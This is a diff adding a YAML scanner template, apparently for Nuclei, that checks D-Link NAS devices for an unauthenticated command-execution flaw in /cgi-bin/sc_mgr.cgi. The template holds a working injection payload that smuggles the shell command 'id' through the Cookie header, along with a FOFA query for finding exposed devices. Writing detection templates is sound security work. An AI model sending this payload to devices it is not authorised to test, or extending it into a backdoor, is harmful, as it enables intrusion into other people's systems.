@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - uid=
+            - gid=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+          Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;
+id: D-Link-NAS-sc_mgr_cgi-rce
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"
+        D-Link NAS设备 /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info 接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。
+    name: D-Link NAS设备 sc_mgr.cgi 未授权RCE漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/teoAYR31FXC1WmsqCxkjrg?token=635655052&lang=zh_CN
+    severity: high
+    tags:
+        - RCE
